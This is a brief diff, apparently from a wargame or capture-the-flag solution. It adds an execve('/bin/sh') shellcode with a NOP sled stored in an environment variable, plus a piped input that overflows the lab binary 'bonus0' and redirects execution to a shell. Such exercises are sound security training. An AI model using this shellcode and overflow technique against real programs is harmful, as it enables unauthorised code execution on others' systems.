@@ -1,2 +1,7 @@
-print("a"*20)
-print("\xEF\xBE\xAD\xDE" + "b"*9)
+```
+export SHELLCODE=$(python -c 'print("\x90"*80 + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80")')
+```
+
+```
+(python -c 'print("a"*20)'; sleep 0.1; python -c 'print("b"*14 + "\xFD\xF8\xFF\xBF\xBF")'; cat) | ./bonus0
+```
